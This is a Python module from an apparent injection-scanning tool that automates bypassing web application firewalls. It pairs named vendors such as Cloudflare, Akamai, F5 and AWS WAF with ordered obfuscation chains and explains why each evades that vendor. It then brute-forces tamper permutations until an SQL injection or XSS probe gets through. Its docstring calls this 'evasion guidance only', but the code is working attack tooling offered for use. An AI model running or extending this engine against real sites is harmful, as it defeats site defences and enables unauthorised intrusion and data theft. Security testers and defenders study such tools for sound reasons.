"""
WAF bypass strategy engine.

This module builds on core.waf's vendor detection and provides a richer,
per-vendor evasion playbook: ordered tamper chains to try (in priority
order, weakest/least-invasive first), plus human-readable notes on *why*
each chain tends to work against that vendor's inspection engine. When
every known chain for a vendor is exhausted, `find_working_chain()` falls
back to a combinatorial escalation ladder that tries progressively larger
multi-tamper stacks built from the full tamper registry -- this is the
"strong / devasa" fallback for vendors (or custom/unknown WAFs) that resist
the curated per-vendor chains.

This is detection/evasion guidance only -- no exploitation payloads are
generated here, only obfuscation of the standard SQLi/XSS probes already
produced by core.techniques.*.

Usage:
    from core.waf_bypass import get_bypass_plan, find_working_chain
    plan = get_bypass_plan("F5 BIG-IP ASM")
    for chain in plan["chains"]:
        tampered = apply_chain(payload, chain)
        ... try request, check if still blocked ...
"""

import itertools

from core import logger
from core.tamper import apply_chain, REGISTRY as TAMPER_REGISTRY

ALL_TAMPERS = sorted(TAMPER_REGISTRY.keys())

# The strongest possible single chain: every tamper stacked together. Used
# as a final "kitchen sink" attempt for every vendor before falling back to
# combinatorial escalation.
NUCLEAR_CHAIN = [
    "space2comment", "randomcase", "charencode", "equaltolike",
    "versionedcomments", "apostrophemask", "unionalltrick", "spacetoplus",
]

# Ordered list of tamper chains to try per vendor, from least to most
# aggressive transformation. Each chain is a list of tamper script names
# (see core/tamper/__init__.py for the registry).
WAF_BYPASS_PLAYBOOK = {
    "Cloudflare": {
        "notes": (
            "Cloudflare's managed rules key heavily on literal keyword matching "
            "and simple regex signatures. Randomizing keyword case and swapping "
            "whitespace for inline comments typically slips past the generic "
            "ruleset; hex/URL-encoding individual characters helps against the "
            "stricter OWASP-based rule groups."
        ),
        "chains": [
            ["randomcase"],
            ["space2comment", "randomcase"],
            ["charencode", "randomcase"],
            ["space2comment", "charencode", "apostrophemask"],
            ["space2comment", "randomcase", "charencode", "apostrophemask"],
        ],
    },
    "Akamai": {
        "notes": (
            "Akamai Kona/App & API Protector normalizes whitespace aggressively "
            "but is weaker against SQL comment-based obfuscation and versioned "
            "MySQL comments, which are not always normalized before pattern "
            "matching."
        ),
        "chains": [
            ["versionedcomments"],
            ["space2comment", "versionedcomments"],
            ["randomcase", "versionedcomments"],
            ["space2comment", "randomcase", "versionedcomments", "charencode"],
        ],
    },
    "Imperva Incapsula": {
        "notes": (
            "Incapsula's edge rules tend to focus on the literal apostrophe and "
            "equals-sign SQL grammar. Masking the apostrophe with its URL-encoded "
            "or double-encoded form, and rewriting '=' comparisons, both reduce "
            "signature hits."
        ),
        "chains": [
            ["apostrophemask"],
            ["apostrophemask", "randomcase"],
            ["charencode", "equaltolike"],
            ["apostrophemask", "equaltolike", "randomcase", "space2comment"],
        ],
    },
    "F5 BIG-IP ASM": {
        "notes": (
            "ASM's default signature set is keyword + whitespace based; replacing "
            "spaces with inline comments and rewriting '=' as LIKE both commonly "
            "evade the bundled attack signatures without touching custom policies. "
            "Hardened/custom ASM policies (higher violation-rating thresholds) "
            "usually require stacking whitespace obfuscation with case "
            "randomization AND character encoding simultaneously, since ASM's "
            "'SQL-Injection' attack signature set inspects normalized whitespace "
            "and keyword casing separately -- breaking both at once desyncs the "
            "signature match."
        ),
        "chains": [
            ["space2comment"],
            ["space2comment", "equaltolike"],
            ["equaltolike", "randomcase"],
            ["space2comment", "randomcase", "equaltolike"],
            ["space2comment", "randomcase", "equaltolike", "charencode"],
            ["space2comment", "randomcase", "equaltolike", "charencode", "apostrophemask"],
        ],
    },
    "Sucuri": {
        "notes": (
            "Sucuri's WAF relies on case-sensitive keyword blacklists in many "
            "configurations; simple case randomization combined with comment "
            "based whitespace substitution is often sufficient."
        ),
        "chains": [
            ["randomcase"],
            ["randomcase", "space2comment"],
            ["randomcase", "space2comment", "charencode"],
        ],
    },
    "AWS WAF": {
        "notes": (
            "AWS Managed Rules (SQLiRuleSet) use libinjection-style parsing, "
            "which is more resistant to plain case/whitespace tricks, but is "
            "commonly desynced by character-level percent-encoding and by "
            "restructuring UNION SELECT with the ALL keyword."
        ),
        "chains": [
            ["charencode"],
            ["unionalltrick", "charencode"],
            ["unionalltrick", "space2comment", "charencode"],
            ["unionalltrick", "space2comment", "charencode", "randomcase"],
        ],
    },
    "ModSecurity": {
        "notes": (
            "The OWASP CRS relies on regex signatures tuned to common payload "
            "shapes. Layering versioned comments with whitespace and case "
            "transforms breaks up the token sequence CRS expects."
        ),
        "chains": [
            ["versionedcomments", "space2comment"],
            ["randomcase", "versionedcomments"],
            ["space2comment", "randomcase", "versionedcomments"],
            ["space2comment", "randomcase", "versionedcomments", "charencode"],
        ],
    },
    "Barracuda": {
        "notes": (
            "Barracuda's engine flags raw whitespace and '=' comparisons in "
            "SQL-like strings; comment substitution and LIKE rewriting are "
            "usually enough."
        ),
        "chains": [
            ["space2comment"],
            ["space2comment", "equaltolike"],
            ["space2comment", "equaltolike", "randomcase"],
        ],
    },
    "Fortinet FortiWeb": {
        "notes": (
            "FortiWeb's signature engine is keyword-case sensitive by default in "
            "many deployments; randomizing case combined with percent-encoding "
            "of special characters is effective."
        ),
        "chains": [
            ["randomcase"],
            ["randomcase", "charencode"],
            ["randomcase", "charencode", "space2comment"],
        ],
    },
    "Wordfence": {
        "notes": (
            "Wordfence's WAF (application-layer, PHP-based) pattern matches on "
            "raw SQL keyword sequences; whitespace-to-comment substitution plus "
            "apostrophe masking is generally sufficient since it lacks the deep "
            "normalization of edge/network WAFs."
        ),
        "chains": [
            ["space2comment"],
            ["apostrophemask", "space2comment"],
            ["apostrophemask", "space2comment", "randomcase"],
        ],
    },
    "DDoS-Guard": {
        "notes": (
            "DDoS-Guard's WAF module is signature-lite and mostly rate/volume "
            "focused; basic whitespace-to-plus and case randomization is "
            "typically enough to slip through its lighter SQLi ruleset."
        ),
        "chains": [
            ["spacetoplus"],
            ["spacetoplus", "randomcase"],
        ],
    },
    "StackPath": {
        "notes": (
            "StackPath WAF uses a signature set similar to ModSecurity CRS; "
            "percent-encoding plus comment-based whitespace substitution "
            "commonly bypasses the default sensitivity level."
        ),
        "chains": [
            ["charencode"],
            ["charencode", "space2comment"],
            ["charencode", "space2comment", "randomcase"],
        ],
    },
    "unknown": {
        "notes": (
            "No vendor fingerprint matched; falling back to a generic, broadly "
            "effective evasion sequence (whitespace obfuscation + case "
            "randomization) that defeats many naive keyword-blacklist filters."
        ),
        "chains": [
            ["space2comment"],
            ["randomcase"],
            ["space2comment", "randomcase", "charencode"],
        ],
    },
}


def get_bypass_plan(vendor: str) -> dict:
    """Return the bypass playbook entry for a vendor, or the generic
    fallback if the vendor is unknown / unmapped. Always ends with the
    NUCLEAR_CHAIN as a final attempt."""
    base = WAF_BYPASS_PLAYBOOK.get(vendor, WAF_BYPASS_PLAYBOOK["unknown"])
    chains = list(base["chains"])
    if NUCLEAR_CHAIN not in chains:
        chains.append(NUCLEAR_CHAIN)
    for chain in chains:
        for name in chain:
            if name not in TAMPER_REGISTRY:
                logger.warn(f"[WAF-Bypass] tamper script '{name}' referenced but not registered")
    return {"notes": base["notes"], "chains": chains}


def generate_escalation_chains(max_len: int = 3, cap: int = 20):
    """
    Combinatorial fallback: generate multi-tamper chains from the full
    tamper registry, ordered by increasing length, for use against custom
    or unrecognized WAF policies once the curated per-vendor playbook and
    the nuclear chain have both failed.
    """
    generated = []
    for length in range(2, max_len + 1):
        for combo in itertools.permutations(ALL_TAMPERS, length):
            generated.append(list(combo))
            if len(generated) >= cap:
                return generated
    return generated


def find_working_chain(waf_vendor: str, probe_fn, escalate: bool = True, escalation_cap: int = 20):
    """
    Try each chain in the vendor's playbook (in order), then -- if escalate
    is True and every curated chain still gets blocked -- fall back to a
    combinatorial escalation ladder built from the full tamper registry.

    probe_fn(chain) -> bool must apply the chain itself (via apply_chain)
    and return True if the request got through (not blocked by the WAF).

    Returns (chain, source) on success where source is "playbook",
    "nuclear", or "escalation"; returns (None, None) if nothing worked.
    """
    plan = get_bypass_plan(waf_vendor)
    logger.waf(f"[WAF-Bypass] {waf_vendor}: {plan['notes']}")

    for chain in plan["chains"]:
        source = "nuclear" if chain == NUCLEAR_CHAIN else "playbook"
        logger.waf(f"[WAF-Bypass] trying chain ({source}): {' -> '.join(chain)}")
        if probe_fn(chain):
            logger.ok(f"[WAF-Bypass] chain succeeded: {' -> '.join(chain)}")
            return chain, source
        logger.warn(f"[WAF-Bypass] chain still blocked: {' -> '.join(chain)}")

    if not escalate:
        logger.critical("[WAF-Bypass] all known bypass chains were blocked for this vendor")
        return None, None

    logger.waf("[WAF-Bypass] curated playbook exhausted -- escalating to combinatorial multi-tamper stacks")
    for chain in generate_escalation_chains(cap=escalation_cap):
        logger.waf(f"[WAF-Bypass] trying chain (escalation): {' -> '.join(chain)}")
        if probe_fn(chain):
            logger.ok(f"[WAF-Bypass] escalation chain succeeded: {' -> '.join(chain)}")
            return chain, "escalation"

    logger.critical("[WAF-Bypass] all bypass strategies (playbook + nuclear + escalation) were blocked")
    return None, None
